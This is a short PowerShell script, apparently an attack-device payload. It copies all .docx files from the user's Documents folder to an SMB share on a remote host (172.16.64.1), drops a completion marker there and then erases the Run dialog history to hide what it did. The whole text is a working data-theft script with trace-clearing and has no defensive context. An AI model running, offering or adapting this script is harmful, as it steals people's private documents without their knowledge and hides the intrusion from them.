$exfil_dir="$Env:UserProfile\Documents"
$exfil_ext="*.docx"
$loot_dir="\\172.16.64.1\s\e\$Env:ComputerName\$((Get-Date).ToString('yyyy-MM-dd_hhmmtt'))"
mkdir $loot_dir
robocopy $exfil_dir $loot_dir $exfil_ext /S /MT /Z
New-Item -Path \\172.16.64.1\s -Name "EXFILTRATION_COMPLETE" -Value "EXFILTRATION_COMPLETE"
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
